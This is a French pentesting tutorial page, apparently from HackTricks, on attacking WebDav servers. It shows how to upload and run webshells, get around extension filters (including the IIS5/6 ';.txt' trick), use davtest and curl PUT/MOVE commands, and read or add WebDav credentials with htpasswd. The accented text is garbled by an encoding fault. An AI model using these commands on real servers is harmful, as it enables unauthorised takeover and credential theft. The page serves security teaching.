# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Un **serveur HTTP avec WebDav** actif est un serveur o√π vous pouvez probablement **mettre √† jour, supprimer, d√©placer, copier** des fichiers. **Parfois**, vous **avez besoin** d'avoir des **identifiants valides** (v√©rifiez habituellement avec l'authentification HTTP de base).

Vous devriez essayer de **t√©l√©verser** un **webshell** et de l'**ex√©cuter** depuis le serveur web pour prendre le contr√¥le du serveur.\
Habituellement, pour **se connecter** √† un serveur WebDav, vous aurez besoin d'**identifiants valides** : [**Bruteforce WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) _(Authentification de base)_.

Une autre configuration courante est d'**interdire le t√©l√©versement** de fichiers avec des **extensions** qui seront **ex√©cut√©es** par le serveur web, vous devriez v√©rifier comment **contourner cela :**

* **T√©l√©versez** des fichiers avec des **extensions ex√©cutables** (peut-√™tre que ce n'est pas interdit).
* **T√©l√©versez** des fichiers **sans extensions ex√©cutables** (comme .txt) et essayez de **renommer** le fichier (d√©placer) avec une **extension ex√©cutable**.
* **T√©l√©versez** des fichiers **sans extensions ex√©cutables** (comme .txt) et essayez de **copier** le fichier (d√©placer) avec **une extension ex√©cutable**.

## DavTest

**Davtest** essaie de **t√©l√©verser plusieurs fichiers avec diff√©rentes extensions** et de **v√©rifier** si l'extension est **ex√©cut√©e** :
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
Exemple de sortie :

![](<../../.gitbook/assets/image (19) (1).png>)

Cela ne signifie pas que les extensions **.txt** et **.html sont ex√©cut√©es**. Cela signifie que vous pouvez **acc√©der √† ces fichiers** via le web.

## Cadaver

Vous pouvez utiliser cet outil pour **vous connecter au serveur WebDav** et effectuer des actions (comme **t√©l√©verser**, **d√©placer** ou **supprimer**) **manuellement**.
```
cadaver <IP>
```
## Requ√™te PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Requ√™te MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, aliment√©s par les outils communautaires **les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Vuln√©rabilit√© IIS5/6 WebDav

Cette vuln√©rabilit√© est tr√®s int√©ressante. Le **WebDav** **ne permet pas** de **t√©l√©verser** ou de **renommer** des fichiers avec l'extension **.asp**. Mais vous pouvez **contourner** cela en **ajoutant** √† la fin du nom **";.txt"** et le fichier sera **ex√©cut√©** comme s'il s'agissait d'un fichier .asp (vous pourriez √©galement **utiliser ".html" au lieu de ".txt"** mais **n'oubliez pas le ";"**).

Ensuite, vous pouvez **t√©l√©verser** votre shell sous forme de fichier ".**txt"** et le **copier/d√©placer** en un fichier ".asp;.txt". En acc√©dant √† ce fichier via le serveur web, il sera **ex√©cut√©** (cadaver dira que l'action de d√©placement n'a pas fonctionn√©, mais en r√©alit√© si).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Post credentials

Si le Webdav utilisait un serveur Apache, vous devriez regarder les sites configur√©s dans Apache. Commun√©ment :\
_**/etc/apache2/sites-enabled/000-default**_

√Ä l'int√©rieur, vous pourriez trouver quelque chose comme :
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Comme vous pouvez le voir, il y a les fichiers avec les **identifiants** valides pour le serveur **webdav** :
```
/etc/apache2/users.password
```
Dans ce type de fichiers, vous trouverez le **username** et un **hash** du mot de passe. Ce sont les identifiants que le serveur webdav utilise pour authentifier les utilisateurs.

Vous pouvez essayer de les **crack**, ou d'**ajouter plus** si pour une raison quelconque vous voulez **acc√©der** au serveur **webdav** :
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Pour v√©rifier si les nouveaux identifiants fonctionnent, vous pouvez faire :
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, aliment√©s par les outils communautaires **les plus avanc√©s**.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
